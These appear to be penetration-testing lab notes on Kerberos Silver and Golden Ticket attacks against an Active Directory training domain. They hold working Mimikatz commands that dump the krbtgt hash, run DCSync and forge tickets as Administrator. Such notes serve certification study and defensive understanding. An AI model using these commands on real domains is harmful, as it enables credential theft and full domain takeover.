### Silver Ticket
- Encrypted and Signed by the hash of the service account of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).

#### Attack
- Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
• Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more

![[Pasted image 20231215170859.png]]



---
### Golden Ticket
- A golden ticket is signed and encrypted by the hash of krbtgt account for TGT ticket.
- The krbtgt user hash could be used to _impersonate any user with any privileges_ from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

#### Attack
- Run mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

• To use the DC-Sync feature for getting AES keys for krbtgt account. Run with DA privileges (or a user that has replication rights on the domain object):
```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

__Create Golden Ticket__
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![[Pasted image 20231215170136.png]]
![[Pasted image 20231215170247.png]]










